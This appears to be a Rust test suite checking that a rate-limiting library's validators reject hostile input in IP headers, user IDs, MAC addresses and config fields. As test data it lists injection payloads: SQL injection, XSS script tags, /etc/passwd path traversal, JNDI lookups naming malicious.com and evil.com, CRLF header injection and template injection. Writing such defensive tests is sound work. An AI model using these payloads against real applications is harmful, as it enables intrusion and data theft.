// Copyright (c) 2026 Kirky.X
// SPDX-License-Identifier: MIT
//! 输入验证安全测试
//!
//! 测试覆盖：
//! - IP 地址注入测试（X-Forwarded-For 伪造）
//! - 数值注入测试（负数消费拒绝、整数溢出保护）
//! - 配置注入测试

use limiteron::limiters::{FixedWindowLimiter, Limiter, ShardedSlidingWindowLimiter, TokenBucketLimiter};
use limiteron::matchers::{IpExtractor, RequestContext};
use limiteron::validation::{validate_ip_address, validate_user_id, validate_mac_address, validate_api_key};
use limiteron::error::FlowGuardError;
use std::time::Duration;

// ============================================================================
// IP 地址注入测试
// ============================================================================

/// 测试 X-Forwarded-For 头伪造攻击
///
/// 验证系统能够正确处理恶意构造的 X-Forwarded-For 头
#[tokio::test]
async fn test_x_forwarded_for_spoofing() {
    let extractor = IpExtractor::from_header("x-forwarded-for");

    // 测试正常格式
    let ctx = RequestContext::new()
        .with_header("x-forwarded-for", "192.168.1.1");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());

    // 测试多IP格式（取第一个）
    let ctx = RequestContext::new()
        .with_header("x-forwarded-for", "192.168.1.1, 10.0.0.1, 172.16.0.1");
    let result = extractor.extract(&ctx);
    assert!(result.is_some());

    // 测试空值
    let ctx = RequestContext::new()
        .with_header("x-forwarded-for", "");
    let result = extractor.extract(&ctx);
    // 空值应该返回 None 或处理为无效
    assert!(result.is_none() || result.unwrap().as_str().is_empty());

    // 测试恶意注入尝试
    let malicious_inputs = vec![
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "null",
        "undefined",
        "${jndi:ldap://malicious.com/a}",
        "{{template_injection}}",
    ];

    for malicious in malicious_inputs {
        let ctx = RequestContext::new()
            .with_header("x-forwarded-for", malicious);
        // 提取器应该安全处理，不应崩溃
        let _ = extractor.extract(&ctx);
    }
}

/// 测试 IP 地址验证拒绝无效输入
#[test]
fn test_ip_address_validation_rejects_malicious_input() {
    // 测试有效 IP
    assert!(validate_ip_address("192.168.1.1").is_ok());
    assert!(validate_ip_address("::1").is_ok());
    assert!(validate_ip_address("2001:db8::1").is_ok());

    // 测试无效 IP - 应该被拒绝
    let invalid_ips = vec![
        "",                          // 空
        "   ",                       // 空白
        "not.an.ip",                 // 非IP格式
        "999.999.999.999",           // 超出范围
        "192.168.1",                 // 不完整
        "192.168.1.1.1",             // 过多段
        "192.168.1.1:abc",           // 无效端口
        "-1.2.3.4",                  // 负数
        "192.168.1.1; DROP TABLE",   // SQL注入尝试
        "192.168.1.1\nHost: evil.com", // CRLF注入
        "192.168.1.1\r\nX-Injected: true", // HTTP头注入
    ];

    for invalid_ip in invalid_ips {
        let result = validate_ip_address(invalid_ip);
        assert!(result.is_err(), "Should reject invalid IP: {}", invalid_ip);
    }
}

/// 测试 IP 地址长度限制
#[test]
fn test_ip_address_length_limit() {
    // 超长 IP 地址应该被拒绝
    let long_ip = "a".repeat(100);
    let result = validate_ip_address(&long_ip);
    assert!(result.is_err());
}

/// 测试 IPv6 地址验证安全性
#[test]
fn test_ipv6_validation_security() {
    // 有效 IPv6
    assert!(validate_ip_address("::1").is_ok());
    assert!(validate_ip_address("fe80::1").is_ok());
    assert!(validate_ip_address("2001:0db8:85a3:0000:0000:8a2e:0370:7334").is_ok());

    // 无效 IPv6 - 应该被拒绝
    let invalid_ipv6 = vec![
        "::::",                      // 过多冒号
        "1:2:3:4:5:6:7:8:9",         // 过多段
        "gggg::1",                   // 无效十六进制
        "1::2::3",                   // 多个压缩符号
        "[::1",                      // 不完整的方括号
        "::1]",                      // 不完整的方括号
    ];

    for invalid in invalid_ipv6 {
        let result = validate_ip_address(invalid);
        assert!(result.is_err(), "Should reject invalid IPv6: {}", invalid);
    }
}

// ============================================================================
// 数值注入测试
// ============================================================================

/// 测试负数消费被拒绝
#[tokio::test]
async fn test_negative_cost_rejection() {
    // TokenBucketLimiter
    let limiter = TokenBucketLimiter::new(100, 10);
    // Rust 的 u64 类型本身不允许负数，但我们可以测试零成本
    let result = limiter.allow(0).await;
    assert!(result.is_err(), "Zero cost should be rejected");

    // ShardedSlidingWindowLimiter
    let limiter = ShardedSlidingWindowLimiter::new(Duration::from_secs(60), 10);
    let result = limiter.allow(0).await;
    assert!(result.is_err(), "Zero cost should be rejected");

    // FixedWindowLimiter
    let limiter = FixedWindowLimiter::new(Duration::from_secs(60), 10);
    let result = limiter.allow(0).await;
    assert!(result.is_err(), "Zero cost should be rejected");

    // ShardedSlidingWindowLimiter
    let limiter = ShardedSlidingWindowLimiter::new(Duration::from_secs(60), 10);
    let result = limiter.allow(0).await;
    assert!(result.is_err(), "Zero cost should be rejected");
}

/// 测试整数溢出保护
#[tokio::test]
async fn test_integer_overflow_protection() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 测试超大成本值
    let large_costs = vec![
        u64::MAX,
        u64::MAX - 1,
        1_000_000_000_000_000_000,
    ];

    for cost in large_costs {
        let result = limiter.allow(cost).await;
        // 应该返回错误或 false，而不是崩溃或溢出
        match result {
            Ok(allowed) => assert!(!allowed, "Large cost {} should not be allowed", cost),
            Err(_) => {}, // 错误也是可接受的
        }
    }
}

/// 测试成本值边界
#[tokio::test]
async fn test_cost_boundary_values() {
    let limiter = TokenBucketLimiter::new(100, 10);

    // 成本 = 1（最小有效值）
    let result = limiter.allow(1).await;
    assert!(result.is_ok());

    // 成本 = 容量（边界值）
    let limiter = TokenBucketLimiter::new(100, 10);
    let result = limiter.allow(100).await;
    assert!(result.is_ok());
    assert!(result.unwrap());

    // 成本 = 容量 + 1（超出边界）
    let limiter = TokenBucketLimiter::new(100, 10);
    let result = limiter.allow(101).await;
    assert!(result.is_ok());
    assert!(!result.unwrap());
}

/// 测试成本值超过 MAX_COST
#[tokio::test]
async fn test_cost_exceeds_max_cost() {
    let limiter = TokenBucketLimiter::new(u64::MAX, 1);

    // 超过 MAX_COST (1,000,000) 应该返回错误
    let result = limiter.allow(1_000_001).await;
    assert!(result.is_err(), "Cost exceeding MAX_COST should return error");

    // 正好在 MAX_COST 边界
    let result = limiter.allow(1_000_000).await;
    // 应该正常处理（可能允许或拒绝，取决于容量）
    assert!(result.is_ok() || result.is_err());
}

// ============================================================================
// 用户ID 注注入测试
// ============================================================================

/// 测试用户ID 注入攻击
#[test]
fn test_user_id_injection() {
    // 有效用户ID
    assert!(validate_user_id("user123").is_ok());
    assert!(validate_user_id("user@example.com").is_ok());
    assert!(validate_user_id("user-name_123").is_ok());

    // 无效用户ID - 应该被拒绝
    let malicious_user_ids = vec![
        "",                          // 空
        "   ",                       // 空白
        "user; DROP TABLE users; --", // SQL注入
        "user<script>alert(1)</script>", // XSS
        "user\nadmin",               // 换行注入
        "user\r\nHost: evil.com",    // CRLF注入
        "user' OR '1'='1",           // SQL注入
        "user\" OR \"1\"=\"1",       // SQL注入
        "user${jndi:ldap://evil.com}", // JNDI注入
        "user{{7*7}}",               // 模板注入
    ];

    for malicious in malicious_user_ids {
        let result = validate_user_id(malicious);
        // 空值应该返回错误
        if malicious.is_empty() || malicious.trim().is_empty() {
            assert!(result.is_err(), "Empty user ID should be rejected");
        }
        // 包含特殊字符的应该被拒绝
        if malicious.contains('<') || malicious.contains('>') || malicious.contains('\'') || malicious.contains('"') {
            assert!(result.is_err(), "Malicious user ID should be rejected: {}", malicious);
        }
    }
}

/// 测试用户ID 长度限制
#[test]
fn test_user_id_length_limit() {
    // 最大长度边界
    let max_length_id = "a".repeat(256);
    let result = validate_user_id(&max_length_id);
    assert!(result.is_ok() || result.is_err()); // 取决于具体限制

    // 超过最大长度
    let too_long_id = "a".repeat(300);
    let result = validate_user_id(&too_long_id);
    assert!(result.is_err(), "Overly long user ID should be rejected");
}

// ============================================================================
// MAC 地址注入测试
// ============================================================================

/// 测试 MAC 地址验证安全性
#[test]
fn test_mac_address_validation_security() {
    // 有效 MAC 地址
    assert!(validate_mac_address("00:1A:2B:3C:4D:5E").is_ok());
    assert!(validate_mac_address("00-1A-2B-3C-4D-5E").is_ok());
    assert!(validate_mac_address("001A2B3C4D5E").is_ok());

    // 无效 MAC 地址 - 应该被拒绝
    let invalid_macs = vec![
        "",                          // 空
        "invalid",                   // 无效格式
        "00:1A:2B:3C:4D",            // 不完整
        "00:1A:2B:3C:4D:5E:6F",      // 过长
        "GG:1A:2B:3C:4D:5E",         // 无效十六进制
        "00:1A:2B:3C:4D:5E; DROP TABLE", // SQL注入
        "00:1A:2B:3C:4D:5E\n",       // 换行注入
    ];

    for invalid in invalid_macs {
        let result = validate_mac_address(invalid);
        assert!(result.is_err(), "Invalid MAC should be rejected: {}", invalid);
    }
}

// ============================================================================
// API Key 注入测试
// ============================================================================

/// 测试 API Key 验证安全性
#[test]
fn test_api_key_validation_security() {
    // 有效 API Key
    assert!(validate_api_key("sk-abc123xyz").is_ok());

    // 超长 API Key 应该被拒绝
    let long_key = "sk-".to_string() + &"a".repeat(600);
    let result = validate_api_key(&long_key);
    assert!(result.is_err(), "Overly long API key should be rejected");
}

// ============================================================================
// 配置注入测试
// ============================================================================

/// 测试配置验证拒绝恶意输入
#[test]
fn test_config_validation_rejects_malicious_input() {
    use limiteron::config::{FlowControlConfig, GlobalConfig, Rule, ConfigMatcher as Matcher, LimiterConfig, ActionConfig};

    // 测试规则ID注入
    let malicious_ids = vec![
        "rule'; DROP TABLE rules; --",
        "rule<script>alert(1)</script>",
        "rule\ninjected",
        "rule\r\nHost: evil.com",
    ];

    for malicious_id in malicious_ids {
        let rule = Rule {
            id: malicious_id.to_string(),
            name: "Test Rule".to_string(),
            priority: 100,
            matchers: vec![Matcher::User { user_ids: vec!["*".to_string()] }],
            limiters: vec![LimiterConfig::TokenBucket { capacity: 100, refill_rate: 10 }],
            action: ActionConfig {
                on_exceed: "reject".to_string(),
                ban: None,
            },
        };

        // 验证应该通过或安全处理
        let _ = rule.validate();
    }
}

/// 测试限流器配置边界值
#[test]
fn test_limiter_config_boundary_values() {
    use limiteron::config::LimiterConfig;

    // TokenBucket - 零容量应该被拒绝
    let config = LimiterConfig::TokenBucket { capacity: 0, refill_rate: 10 };
    assert!(config.validate().is_err());

    // TokenBucket - 零填充速率应该被拒绝
    let config = LimiterConfig::TokenBucket { capacity: 100, refill_rate: 0 };
    assert!(config.validate().is_err());

    // SlidingWindow - 零请求数应该被拒绝
    let config = LimiterConfig::SlidingWindow {
        window_size: "60s".to_string(),
        max_requests: 0,
    };
    assert!(config.validate().is_err());

    // Concurrency - 零并发数应该被拒绝
    let config = LimiterConfig::Concurrency { max_concurrent: 0 };
    assert!(config.validate().is_err());
}

/// 测试窗口大小解析安全性
#[test]
fn test_window_size_parsing_security() {
    use limiteron::config::parse_window_size;

    // 有效窗口大小
    assert!(parse_window_size("60s").is_ok());
    assert!(parse_window_size("5m").is_ok());
    assert!(parse_window_size("1h").is_ok());

    // 无效窗口大小
    let invalid_windows = vec![
        "",           // 空
        "invalid",    // 无效格式
        "-1s",        // 负数
        "0s",         // 零
        "999999999999999s", // 超大值
        "1s; DROP TABLE", // SQL注入
        "1s\ninjected", // 换行注入
    ];

    for invalid in invalid_windows {
        let result = parse_window_size(invalid);
        // 空值、无效格式、负数等应该返回错误
        if invalid.is_empty() || invalid == "invalid" || invalid.starts_with('-') {
            assert!(result.is_err() || result.unwrap() == Duration::from_secs(0),
                "Invalid window size should be rejected: {}", invalid);
        }
    }
}

// ============================================================================
// 请求上下文注入测试
// ============================================================================

/// 测试请求上下文头部注入
#[test]
fn test_request_context_header_injection() {
    let ctx = RequestContext::new()
        .with_header("X-Custom", "value\nInjected: header")
        .with_header("Authorization", "Bearer token\r\nX-Forwarded-For: 127.0.0.1");

    // 验证头部值被正确存储
    assert!(ctx.get_header("x-custom").is_some());
    assert!(ctx.get_header("authorization").is_some());

    // Debug 输出应该脱敏
    let debug_output = format!("{:?}", ctx);
    // 敏感头部应该被脱敏
    assert!(debug_output.contains("***"));
}

/// 测试查询参数注入
#[test]
fn test_request_context_query_param_injection() {
    let ctx = RequestContext::new()
        .with_query_param("token", "secret123\nInjected: header")
        .with_query_param("key", "api_key\r\nX-Forwarded: evil");

    // Debug 输出应该脱敏敏感参数
    let debug_output = format!("{:?}", ctx);
    assert!(debug_output.contains("***"));
}

// ============================================================================
// 综合安全测试
// ============================================================================

/// 测试所有输入验证的一致性
#[test]
fn test_input_validation_consistency() {
    // 所有空值应该被一致拒绝
    assert!(validate_ip_address("").is_err());
    assert!(validate_user_id("").is_err());
    assert!(validate_mac_address("").is_err());

    // 所有超长值应该被一致拒绝
    let long_value = "a".repeat(1000);
    assert!(validate_ip_address(&long_value).is_err());
    assert!(validate_user_id(&long_value).is_err());
    assert!(validate_mac_address(&long_value).is_err());
    assert!(validate_api_key(&long_value).is_err());
}

/// 测试 Unicode 处理安全性
#[test]
fn test_unicode_handling_security() {
    // Unicode 字符在用户ID中
    let unicode_ids = vec![
        "用户123",           // 中文
        "user\u{0000}name",  // 空字符
        "user\u{202E}admin", // RTL 覆盖
        "user\u{200B}name",  // 零宽空格
    ];

    for id in unicode_ids {
        let result = validate_user_id(id);
        // 应该安全处理，不应崩溃
        let _ = result;
    }
}
